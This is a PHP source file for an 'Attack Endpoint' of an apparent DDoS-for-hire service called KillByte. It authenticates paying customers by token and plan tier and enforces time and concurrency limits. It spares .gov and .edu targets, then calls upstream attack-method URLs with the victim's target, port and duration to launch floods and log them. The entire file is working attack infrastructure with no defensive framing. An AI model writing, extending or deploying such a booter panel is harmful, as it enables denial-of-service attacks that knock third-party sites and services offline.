<?php
// ========== KillByte API – Attack Endpoint ==========
error_reporting(0);
ini_set('display_errors', 0);

function apiResponse($status, $message, $extra = []) {
    http_response_code($status === 'success' ? 200 : 400);
    header('Content-Type: application/json');
    echo json_encode(array_merge(['status' => $status, 'message' => $message], $extra));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    apiResponse('error', 'Method not allowed. Use GET.');
}

// Required params
$required = ['token', 'target', 'time', 'method'];
foreach ($required as $param) {
    if (!isset($_GET[$param]) || empty($_GET[$param])) {
        apiResponse('error', "Missing required parameter: $param");
    }
}

$token      = $_GET['token'];
$target     = $_GET['target'];
$time       = (int)$_GET['time'];
$method     = $_GET['method'];
$port       = isset($_GET['port']) ? (int)$_GET['port'] : 80;
$concurrents = isset($_GET['concurrents']) ? (int)$_GET['concurrents'] : 1;

// ---------- Token verification ----------
$tokenFile = __DIR__ . '/tokens.txt';
if (!file_exists($tokenFile)) {
    apiResponse('error', 'No tokens exist yet.');
}

$tokens = file($tokenFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$tokenData = null;
foreach ($tokens as $line) {
    $t = json_decode($line, true);
    if ($t && $t['token'] === $token) {
        $tokenData = $t;
        break;
    }
}

if (!$tokenData) {
    apiResponse('error', 'Invalid token.');
}

$username = $tokenData['username'];

// ---------- User verification ----------
$busFile = __DIR__ . '/../bus.txt';
if (!file_exists($busFile)) {
    apiResponse('error', 'System error.');
}

$users = file($busFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$userData = null;
foreach ($users as $line) {
    $parts = explode('|', $line);
    if (count($parts) >= 6 && $parts[0] === $username) {
        $userData = $parts;
        break;
    }
}

if (!$userData) apiResponse('error', 'User not found.');

$plan       = strtolower($userData[4]);
$max_conc   = (int)$userData[2];
$max_time   = (int)$userData[3];
$expiryStr  = $userData[5];

// Expiry check
$expiryDate = DateTime::createFromFormat('d-m-Y', $expiryStr);
if (!$expiryDate || $expiryDate < new DateTime()) {
    apiResponse('error', 'Plan expired.');
}

// VIP check
$vipPlans = ['hobbit', 'advanced', 'terror', 'fresh', 'emerald', 'meteor', 'burial', 'rush', 'blast', 'zomb', 'titan', 'decay', 'owner', 'admin'];
if (!in_array($plan, $vipPlans)) {
    apiResponse('error', 'API access requires a VIP plan.');
}

// Validation
if ($time > $max_time) apiResponse('error', "Time exceeds max ($max_time sec).");
if ($concurrents > $max_conc) apiResponse('error', "Concurrents exceed max ($max_conc).");

// Blacklist
foreach (['gov', '.gov', 'edu', '.edu', 'l7syria', '127.0.0.1', 'localhost'] as $bad) {
    if (stripos($target, $bad) !== false) apiResponse('error', 'Target blacklisted.');
}

// Methods
$methodsFile = __DIR__ . '/../methods.txt';
if (!file_exists($methodsFile)) apiResponse('error', 'Methods missing.');

$methods = [];
foreach (file($methodsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
    list($rawName, $url) = explode('|', $line);
    $cleanName = preg_replace('/^\[[^\]]*\]\s*/', '', trim($rawName));
    $methods[$cleanName] = trim($url);
}

if (!isset($methods[$method])) {
    apiResponse('error', 'Unknown method. Available: ' . implode(', ', array_keys($methods)));
}

// Concurrent check
$ngFile = __DIR__ . '/../ng.txt';
$currentTime = time();
$currentConcurrents = 0;
if (file_exists($ngFile)) {
    foreach (file($ngFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        $att = json_decode($line, true);
        if ($att && $att['end_time'] >= $currentTime && $att['username'] === $username) {
            $currentConcurrents += $att['concurrents'];
        }
    }
}
if (($currentConcurrents + $concurrents) > $max_conc) {
    apiResponse('error', 'Concurrent limit reached.');
}

// Launch
$apiUrl = str_replace(['<target>', '<duration>', '<port>'], [urlencode($target), $time, $port], $methods[$method]);

$batchSize = 5;
$batches = ceil($concurrents / $batchSize);
for ($b = 0; $b < $batches; $b++) {
    $cnt = min($batchSize, $concurrents - ($b * $batchSize));
    $mh = curl_multi_init();
    $hs = [];
    for ($i = 0; $i < $cnt; $i++) {
        $ch = curl_init();
        curl_setopt_array($ch, [CURLOPT_URL => $apiUrl, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 1, CURLOPT_CONNECTTIMEOUT => 1]);
        curl_multi_add_handle($mh, $ch);
        $hs[] = $ch;
    }
    $running = null;
    do { curl_multi_exec($mh, $running); } while ($running);
    foreach ($hs as $ch) { curl_multi_remove_handle($mh, $ch); curl_close($ch); }
    curl_multi_close($mh);
    if ($b < $batches - 1) usleep(100000);
}

// Record
$newAtt = [
    'username'    => $username,
    'target'      => $target,
    'port'        => $port,
    'method'      => $method,
    'concurrents' => $concurrents,
    'start_time'  => time(),
    'end_time'    => time() + $time,
    'id'          => uniqid()
];
file_put_contents($ngFile, json_encode($newAtt) . "\n", FILE_APPEND);

// Update counters
$lnFile = __DIR__ . '/../ln.txt';
file_put_contents($lnFile, (file_exists($lnFile) ? (int)file_get_contents($lnFile) : 0) + $concurrents);

// Increment token usage
$tokenData['requests'] = ($tokenData['requests'] ?? 0) + 1;
$updatedContent = '';
foreach ($tokens as $line) {
    $t = json_decode($line, true);
    if ($t['token'] === $token) $line = json_encode($tokenData);
    $updatedContent .= $line . "\n";
}
file_put_contents($tokenFile, $updatedContent);

apiResponse('success', 'Attack launched.', [
    'attack_id'   => $newAtt['id'],
    'target'      => $target,
    'port'        => $port,
    'method'      => $method,
    'concurrents' => $concurrents,
    'duration'    => $time,
    'expires_at'  => date('Y-m-d H:i:s', $newAtt['end_time']),
    'token_uses'  => $tokenData['requests']
]);